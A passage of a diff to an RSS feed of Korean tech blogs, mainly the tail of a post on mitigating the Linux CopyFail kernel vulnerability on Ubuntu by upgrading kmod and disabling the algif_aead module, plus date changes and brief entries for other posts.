+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;&lt;span style=&quot;color: #333333; text-align: start;&quot;&gt;우분투 리눅스는 취약점이 있는 algif_aead가 module로 빌드되어있기 때문에 &lt;/span&gt;kernel 패키지에 직접 패치 하지 않고&amp;nbsp; 블랙리스트 처리와 비슷하게 /etc/modprobe.d/disable-algif_aead.conf 파일을 만드는 완화 방법을 사용한다.[3] 따라서 해당 conf 파일을 설치하는 패키지를 제공하는데, 패키지 이름은 kmod 로서 다음과 같이 sudo apt install --only-upgrade kmod 명령으로 업데이트하면 된다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;kmod 업그레이드 명령에 --only-upgrade 옵션을 사용하면 의존성에 걸린 다른 패키지들을 줄줄이 업데이트하지 않고 딱 kmod만 업그레이드하도록 되어있다. 회사에서 다른 큰 문제가 없다면 sudo apt upgrade로 싹다 업그레이드해도 되지만, 만약에 다른 프로그램들이 작동 중이라면 안전하게 kmod만 업그레이드하는 것도 괜찮다. 아래는 우분투 22에서 테스트한 결과이다.&lt;/span&gt;&lt;/p&gt;
+        &lt;pre id=&quot;code_1778573678331&quot; class=&quot;bash&quot; data-ke-language=&quot;bash&quot; data-ke-type=&quot;codeblock&quot;&gt;&lt;code&gt;$ sudo apt update
+        ...생략...
+        $ sudo apt install --only-upgrade kmod
+        ...생략...&lt;/code&gt;&lt;/pre&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;이 방법의 장점은 재부팅하지 않고도 활성화 시킬 수 있다. (물론 재부팅을 해도 된다) 그리고나서 algif_aead 커널 모듈이 로딩되어있을테니 제거해주면 된다.&lt;/span&gt;&lt;/p&gt;
+        &lt;pre id=&quot;code_1778573741173&quot; class=&quot;bash&quot; data-ke-language=&quot;bash&quot; data-ke-type=&quot;codeblock&quot;&gt;&lt;code&gt;$ lsmod | grep aead
+        algif_aead             16384  0
+        af_alg                 32768  1 algif_aead
+        
+        $ sudo rmmod algif_aead&lt;/code&gt;&lt;/pre&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;우분투의 kmod가 업그레이드 되면서 설치하는 disable-algif_aead.conf 파일은 copyfail 취약점의 통로인 algif_aead kernel module을 /bin/false로 비활성화 하는 것으로 내용은 다음과 같다.&lt;/span&gt;&lt;/p&gt;
+        &lt;pre id=&quot;code_1778573798416&quot; class=&quot;bash&quot; data-ke-language=&quot;bash&quot; data-ke-type=&quot;codeblock&quot;&gt;&lt;code&gt;$ cat  /etc/modprobe.d/disable-algif_aead.conf
+        # Disable algif_aead module due to CVE-2026-31431 (AKA copy.fail)
+        # This will likely be re-enabled in a subsequent update once an updated
+        # kernel has been deployed.
+        # Blacklisting the module isn&apos;t sufficient, we need to do as below:
+        install algif_aead /bin/false&lt;/code&gt;&lt;/pre&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;간혹 blacklist algif_aead 로 설정하라는 글이 있는데, 위 주석에도 적혀있듯이 blacklist보다는 /bin/false로 하는 방법이 더 깔끔하다. 참고로&amp;nbsp;kmod의&amp;nbsp;conf&amp;nbsp;파일을&amp;nbsp;실수로&amp;nbsp;지웠다든지&amp;nbsp;하는&amp;nbsp;경우에는&amp;nbsp;재설치할&amp;nbsp;때&amp;nbsp;missing&amp;nbsp;conf&amp;nbsp;파일을&amp;nbsp;덮어쓰도록&amp;nbsp;하는&amp;nbsp;옵션을&amp;nbsp;사용해서&amp;nbsp;아래처럼&amp;nbsp;명령해야&amp;nbsp;한다.&lt;/span&gt;&lt;/p&gt;
+        &lt;pre id=&quot;code_1778573819734&quot; class=&quot;bash&quot; data-ke-language=&quot;bash&quot; data-ke-type=&quot;codeblock&quot;&gt;&lt;code&gt;sudo apt-get -o Dpkg::Options::=&quot;--force-confmiss&quot; install --reinstall kmod&lt;/code&gt;&lt;/pre&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&amp;nbsp;&lt;/p&gt;
+        &lt;h2 data-ke-size=&quot;size26&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;4. 결론&lt;/span&gt;&lt;/h2&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;리눅스의 CopyFail 취약점을 패치하기 위해서는 Fedora, Rocky, Ubuntu가 조금씩 다르기 때문에 그에 맞춰서 업그레이드 혹은 패치해주면 된다. 각 리눅스 배포판에 따라 패치가 나와있는지도 확인해보는 것이 좋다.[4] 다만 패치 후에는 확실하게 보완되었는지를 docker 컨테이너에서 테스트를 통해 검증해보는 것도 필요하다고 생각된다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&amp;nbsp;&lt;/p&gt;
+        &lt;h2 data-ke-size=&quot;size26&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;참조&lt;/span&gt;&lt;/h2&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;[1] CopyFail,&amp;nbsp;&lt;a href=&quot;https://copy.fail&quot; target=&quot;_blank&quot; rel=&quot;noopener&amp;nbsp;noreferrer&quot;&gt;https://copy.fail&lt;/a&gt;&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;[2]&amp;nbsp;Mitigating&amp;nbsp;CVE-2026-31431&amp;nbsp;on&amp;nbsp;Rocky&amp;nbsp;Linux&amp;nbsp;8,&amp;nbsp;9,&amp;nbsp;10,&amp;nbsp;and&amp;nbsp;LTS&amp;nbsp;Variants.&amp;nbsp;May&amp;nbsp;1,&amp;nbsp;2026.&amp;nbsp;&lt;a href=&quot;https://kb.ciq.com/article/rocky-linux/rl-cve-2026-31431-mitigation&quot; target=&quot;_blank&quot; rel=&quot;noopener&amp;nbsp;noreferrer&quot;&gt;https://kb.ciq.com/article/rocky-linux/rl-cve-2026-31431-mitigation&lt;/a&gt;&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;[3]&amp;nbsp;Fixes&amp;nbsp;available&amp;nbsp;for&amp;nbsp;CVE-2026-31431,&amp;nbsp;Luci&amp;nbsp;Stanescu,&amp;nbsp;30&amp;nbsp;April&amp;nbsp;2026,&amp;nbsp;&lt;a href=&quot;https://ubuntu.com/blog/copy-fail-vulnerability-fixes-available&quot; target=&quot;_blank&quot; rel=&quot;noopener&amp;nbsp;noreferrer&quot;&gt;https://ubuntu.com/blog/copy-fail-vulnerability-fixes-available&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: &apos;Noto Sans Demilight&apos;, &apos;Noto Sans KR&apos;;&quot;&gt;[4] Vulnerability&amp;nbsp;Intelligence &lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;font-family: &apos;Noto Sans Demilight&apos;, &apos;Noto Sans KR&apos;;&quot;&gt;CVE-2026-31431, &lt;a href=&quot;https://mondoo.com/vulnerability-intelligence/vulnerability/CVE-2026-31431&quot; target=&quot;_blank&quot; rel=&quot;noopener&amp;nbsp;noreferrer&quot;&gt;https://mondoo.com/vulnerability-intelligence/vulnerability/CVE-2026-31431&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&amp;nbsp;&lt;/p&gt;
+      </content:encoded>
     </item>
     <item>
       <title>Karpathy LLM Wiki, 진짜 효과가 있을까 - 72-run 벤치마크와 셋팅 가이드</title>
       <link>https://roboco.io/posts/karpathy-llm-wiki-72-run-benchmark/</link>
       <guid>https://roboco.io/posts/karpathy-llm-wiki-72-run-benchmark/</guid>
-      <pubDate>Mon, 11 May 2026 17:23:28 GMT</pubDate>
+      <pubDate>Tue, 12 May 2026 17:08:45 GMT</pubDate>
       <content:encoded>
         &lt;blockquote&gt;
         &lt;p&gt;&amp;ldquo;에이전트가 매번 모든 걸 다시 유도하지 않게 하려면, 컴파일된 지식 아티팩트가 필요하다.&amp;rdquo; — Andrej Karpathy, &lt;em&gt;LLM Wiki&lt;/em&gt; (GitHub Gist, 2026-04)&lt;sup id=&quot;fnref:1&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote-ref&quot; role=&quot;doc-noteref&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
@@ -31,52 +224,10 @@
       </content:encoded>
     </item>
     <item>
-      <title>How to Stay Happy While Working Long Hours</title>
-      <link>https://maxkim-j.github.io/posts/how-to-stay-happy-while-working-long-hours-en</link>
-      <guid>https://maxkim-j.github.io/posts/how-to-stay-happy-while-working-long-hours-en</guid>
-      <pubDate>Mon, 11 May 2026 17:23:28 GMT</pubDate>
-      <content:encoded>Four practices for staying happy in the middle of overwork</content:encoded>
-    </item>
-    <item>
-      <title>오래 일하면서 행복해지는 법</title>
-      <link>https://maxkim-j.github.io/posts/how-to-stay-happy-while-working-long-hours</link>
-      <guid>https://maxkim-j.github.io/posts/how-to-stay-happy-while-working-long-hours</guid>
-      <pubDate>Mon, 11 May 2026 17:23:28 GMT</pubDate>
-      <content:encoded>과로 속에서도 행복을 지키기 위해 실천한 네 가지</content:encoded>
-    </item>
-    <item>
-      <title>시지프 신화 읽기</title>
-      <link>https://maxkim-j.github.io/posts/reading-the-myth-of-sisyphus</link>
-      <guid>https://maxkim-j.github.io/posts/reading-the-myth-of-sisyphus</guid>
-      <pubDate>Mon, 11 May 2026 17:23:28 GMT</pubDate>
-      <content:encoded>이걸 자기개발서처럼 읽으면 안 된다</content:encoded>
-    </item>
-    <item>
-      <title>Reading The Myth of Sisyphus</title>
-      <link>https://maxkim-j.github.io/posts/reading-the-myth-of-sisyphus-en</link>
-      <guid>https://maxkim-j.github.io/posts/reading-the-myth-of-sisyphus-en</guid>
-      <pubDate>Mon, 11 May 2026 17:23:28 GMT</pubDate>
-      <content:encoded>Why The Myth of Sisyphus shouldn&apos;t be read as a self-help book</content:encoded>
-    </item>
-    <item>
-      <title>Unlearning Unlearning</title>
-      <link>https://maxkim-j.github.io/posts/unlearning-unlearning-en</link>
-      <guid>https://maxkim-j.github.io/posts/unlearning-unlearning-en</guid>
-      <pubDate>Mon, 11 May 2026 17:23:28 GMT</pubDate>
-      <content:encoded>It&apos;s just something you do</content:encoded>
-    </item>
-    <item>
-      <title>언러닝을 언러닝하기</title>
-      <link>https://maxkim-j.github.io/posts/unlearning-unlearning</link>
-      <guid>https://maxkim-j.github.io/posts/unlearning-unlearning</guid>
-      <pubDate>Mon, 11 May 2026 17:23:28 GMT</pubDate>
-      <content:encoded>걍 하는거다</content:encoded>
-    </item>
-    <item>
       <title>[SE-0524] Add withTemporaryAllocation using Output(Raw)Span</title>
       <link>https://green1229.tistory.com/619</link>
       <guid>https://green1229.tistory.com/619</guid>
-      <pubDate>Mon, 11 May 2026 17:23:28 GMT</pubDate>
+      <pubDate>Tue, 12 May 2026 17:08:45 GMT</pubDate>
       <content:encoded>
         &lt;p data-ke-size=&quot;size18&quot;&gt;&lt;span style=&quot;font-family: &apos;Nanum Gothic&apos;;&quot;&gt;안녕하세요. &lt;span style=&quot;color: #409d00;&quot;&gt;&lt;b&gt;그린&lt;/b&gt;&lt;/span&gt;입니다  &lt;/span&gt;&lt;/p&gt;
         &lt;p data-ke-size=&quot;size18&quot;&gt;&lt;span style=&quot;font-family: &apos;Nanum Gothic&apos;;&quot;&gt;이번 포스팅에서는 &lt;span style=&quot;background-color: #9feec3;&quot;&gt;&lt;b&gt;SE-0524 &amp;mdash; OutputSpan을 활용한 withTemporaryAllocation 추가&lt;/b&gt;&lt;/span&gt;에 대해 정리해보겠습니다  &lt;br /&gt;&lt;/span&gt;&lt;/p&gt;
@@ -223,7 +374,7 @@
       <title>시스템 구조는 조직의 커뮤니케이션 구조를 닮는다. - 맬빈 콘웨이</title>
       <link>https://neozest2.tistory.com/entry/MelvinConway</link>
       <guid>https://neozest2.tistory.com/entry/MelvinConway</guid>
-      <pubDate>Mon, 11 May 2026 17:23:28 GMT</pubDate>
+      <pubDate>Tue, 12 May 2026 17:08:45 GMT</pubDate>
       <content:encoded>
         &lt;p data-ke-size=&quot;size16&quot;&gt;&amp;nbsp;&lt;/p&gt;
         &lt;p&gt;&lt;figure class=&quot;imageblock alignCenter&quot; data-ke-mobileStyle=&quot;widthOrigin&quot; data-origin-width=&quot;1600&quot; data-origin-height=&quot;2628&quot;&gt;&lt;span data-url=&quot;https://blog.kakaocdn.net/dn/9CXWB/dJMcacQybJV/cuSM4nyPG6AdB8tpKzT6Dk/img.png&quot; data-phocus=&quot;https://blog.kakaocdn.net/dn/9CXWB/dJMcacQybJV/cuSM4nyPG6AdB8tpKzT6Dk/img.png&quot;&gt;&lt;img src=&quot;https://blog.kakaocdn.net/dn/9CXWB/dJMcacQybJV/cuSM4nyPG6AdB8tpKzT6Dk/img.png&quot; srcset=&quot;https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F9CXWB%2FdJMcacQybJV%2FcuSM4nyPG6AdB8tpKzT6Dk%2Fimg.png&quot; onerror=&quot;this.onerror=null; this.src=&apos;//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png&apos;; this.srcset=&apos;//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png&apos;;&quot; loading=&quot;lazy&quot; width=&quot;434&quot; height=&quot;713&quot; data-origin-width=&quot;1600&quot; data-origin-height=&quot;2628&quot;/&gt;&lt;/span&gt;&lt;/figure&gt;
@@ -268,14 +419,14 @@
       <title>AtCoder Next DP Contest 풀이 (Part 1)</title>
       <link>https://justicehui.github.io/atcoder/2026/05/08/ndpc/</link>
       <guid>https://justicehui.github.io/atcoder/2026/05/08/ndpc/</guid>
-      <pubDate>Mon, 11 May 2026 17:23:28 GMT</pubDate>
+      <pubDate>Tue, 12 May 2026 17:08:45 GMT</pubDate>
       <content:encoded>서론 AtCoder Next DP Contest (link)에 출제된 20문제의 DP 문제 중 앞 14문제의 풀이입니다. solved.ac 기준 실버 상위권부터 다이아 중위권 정도 범위의 문제를 다룹니다.</content:encoded>
     </item>
     <item>
       <title>TLS Fingerprinting과 봇 탐지</title>
       <link>https://w0nder.land/posts/75-TLS%20Fingerprinting%EA%B3%BC%20%EB%B4%87%20%ED%83%90%EC%A7%80</link>
       <guid>https://w0nder.land/posts/75-TLS%20Fingerprinting%EA%B3%BC%20%EB%B4%87%20%ED%83%90%EC%A7%80</guid>
-      <pubDate>Mon, 11 May 2026 17:23:28 GMT</pubDate>
+      <pubDate>Tue, 12 May 2026 17:08:45 GMT</pubDate>
       <content:encoded>
         개인 프로젝트에서 쓰던 API가 어느 날부터 이상하게 동작했다. 맥북에서는 JSON이 잘 오는데, 같은 코드를 리눅스 서버에 올리면 결과가 달랐다. 그렇다고 딱 떨어지게 &quot;실패&quot;라고 하기도 어려웠다. HTTP 에러는 없었고 상태 코드는 200이었으며 연결도 정상이었다. 그런데 응답 본문이 JSON이 아니라 HTML이었다.
         열어보니 익숙한 문구가 떴다.
@@ -368,21 +519,21 @@
       <title>[리뷰] 원청: 나답게 산다는 것에 대하여 (스포주의)</title>
       <link>https://jiniya.net/2026/05/city-of-fiction/</link>
       <guid>https://jiniya.net/2026/05/city-of-fiction/</guid>
-      <pubDate>Mon, 11 May 2026 17:23:28 GMT</pubDate>
+      <pubDate>Tue, 12 May 2026 17:08:45 GMT</pubDate>
       <content:encoded>#…</content:encoded>
     </item>
     <item>
       <title>[일상] 코드와 시간 사이에서: 신영진 25년의 초상</title>
       <link>https://jiniya.net/2026/05/code-and-time-shin-youngjin-25-year-portrait/</link>
       <guid>https://jiniya.net/2026/05/code-and-time-shin-youngjin-25-year-portrait/</guid>
-      <pubDate>Mon, 11 May 2026 17:23:28 GMT</pubDate>
+      <pubDate>Tue, 12 May 2026 17:08:45 GMT</pubDate>
       <content:encoded>[AI-GENERATED] 이 문서는 AI가 작성한 것이며, 작성자는 사람이 아닙니다. 이 블로그의 공개된 글을 다 읽은 인공지능이 생각한 나란 사람은?!…</content:encoded>
     </item>
     <item>
       <title>[ai] 사내 문서·코드를 LLM 이 잘 찾게 만드는 법</title>
       <link>https://jiniya.net/2026/05/llm-friendly-internal-search/</link>
       <guid>https://jiniya.net/2026/05/llm-friendly-internal-search/</guid>
-      <pubDate>Mon, 11 May 2026 17:23:28 GMT</pubDate>
+      <pubDate>Tue, 12 May 2026 17:08:45 GMT</pubDate>
       <content:encoded>[AI-GENERATED] 이 문서는 AI가 작성한 것이며, 작성자는 사람이 아닙니다. Redmine 위키·이슈와 여러 git 저장소를 한꺼번에 LLM…</content:encoded>
     </item>
   </channel>
